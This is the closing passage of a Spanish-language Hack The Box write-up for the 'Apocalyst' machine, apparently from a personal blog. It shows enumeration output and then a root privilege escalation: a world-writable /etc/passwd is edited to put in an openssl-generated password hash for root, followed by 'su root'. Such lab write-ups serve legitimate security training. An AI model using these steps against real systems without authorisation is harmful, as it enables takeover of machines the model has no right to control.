+[*] pro030 Processes running by non-root users with shell.................. nope
+[i] pro500 Running processes............................................... skip
+[i] pro510 Running process binaries and permissions........................ skip
+
+==================================( FINISHED )==================================
+www-data@apocalyst:/dev/shm$
+</span></code></pre></div></div>
+
+<p>Algo que nos debe de llamar mucho la atención de los resultados observados es <code class="language-plaintext highlighter-rouge">-rw-rw-rw- 1 root root 1637 Jul 26  2017 /etc/passwd</code>; tenemos privilegios de escritura sobre el recurso <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, por lo que podríamos cambiar la contraseña del usuario <strong>root</strong>. Asi que vamos a crear una contraseña con <code class="language-plaintext highlighter-rouge">openssl</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ openssl passwd
+Password: 
+Verifying - Password: 
+UhAAUAWb9oqLo
+</code></pre></div></div>
+
+<p>Y dentro del archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> cambiaremos la <code class="language-plaintext highlighter-rouge">x</code> del usuario <strong>root</strong> por <code class="language-plaintext highlighter-rouge">UhAAUAWb9oqLo</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:UhAAUAWb9oqLo:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</code></pre></div></div>
+
+<p>Y vamos a migrar al usuario <strong>root</strong> con la contraseña que creamos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@apocalyst:/dev/shm<span class="nv">$ </span>su root
+Password: 
+root@apocalyst:/dev/shm# <span class="nb">whoami
+</span>root
+root@apocalyst:/dev/shm#
+</code></pre></div></div>
+
+<p>Ya nos encontramos como el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#cryptography" class="page__taxonomy-item" rel="tag">Cryptography</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-11-26T00:00:00-06:00">November 26, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-sizzle/" class="pagination--pager" title="Hack The Box Sizzle
+">Previous</a>
+    
+    
+      <a href="/htb-chatterbox/" class="pagination--pager" title="Hack The Box Chatterbox
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
